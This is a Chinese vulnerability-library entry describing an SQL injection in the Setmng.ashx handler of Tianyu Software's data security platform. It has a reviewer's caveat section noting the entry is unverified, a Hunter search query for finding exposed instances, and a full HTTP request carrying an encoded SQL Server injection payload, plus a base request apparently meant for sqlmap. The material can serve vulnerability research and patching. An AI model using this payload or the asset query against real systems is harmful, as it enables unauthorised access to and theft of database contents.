---
source: "wy876 漏洞文库"
id: "vw-3ccdf7f878c304aa3dd9e106"
entity_id: "ve-3ccdf7f878c304aa3dd9e106"
schema_version: "1"
fofa_unverified: "web.body="
title: "天喻软件数据安全平台 Setmng.ashx 存在SQL注入漏洞"
product: "天喻软件数据安全平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "ASP.NET会话Cookie，疑SQL Server；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E5%A4%A9%E5%96%BB%E7%BB%88%E7%AB%AF/%E5%A4%A9%E5%96%BB%E8%BD%AF%E4%BB%B6%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%B9%B3%E5%8F%B0Setmng.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/eapt0rguixag6qgu"
source_status: "recorded"
---

# 天喻软件数据安全平台 Setmng.ashx 存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：天喻软件数据安全平台
- 本文讨论：Setmng.ashx getparamvalue paramname SQL注入
- 版本、权限与配置前提：ASP.NET会话Cookie，疑SQL Server；版本未知
- 资料类型：SQL注入请求摘录；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 目录天喻终端/智能设备与正文数据安全平台不精确
- 仅请求无错误/布尔对照响应，sqlmap段其实只是原始请求
- FOFA字段装入Hunter语法且值残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 会话权限、数据库、版本与响应待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
武汉天喻软件有限公司是依托国家企业信息化应用支撑软件工程技术研究中心成立的专业数字化设计软件提供商，武汉天喻软件有限公司天喻软件数据安全平台 Setmng.ashx 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 天喻软件数据安全平台

# 三、资产测绘
+ hunter`web.body="数据安全"&&web.body="天喻"`
+ 特征


# 四、漏洞复现
```http
GET /p_handler/Setmng.ashx?operatetype=getparamvalue&paramname=1%27%2b(SELECT%20CHAR(90)%2bCHAR(103)%2bCHAR(103)%2bCHAR(71)%20WHERE%205505=5505%20AND%206796%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(118)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(6796=6796)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)%2bCHAR(113))))%2b%27 HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=uby******************ybm
Upgrade-Insecure-Requests: 1
```


sqlmap

```http
GET /p_handler/Setmng.ashx?operatetype=getparamvalue&paramname=1 HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=uby******************ybm
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/eapt0rguixag6qgu>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
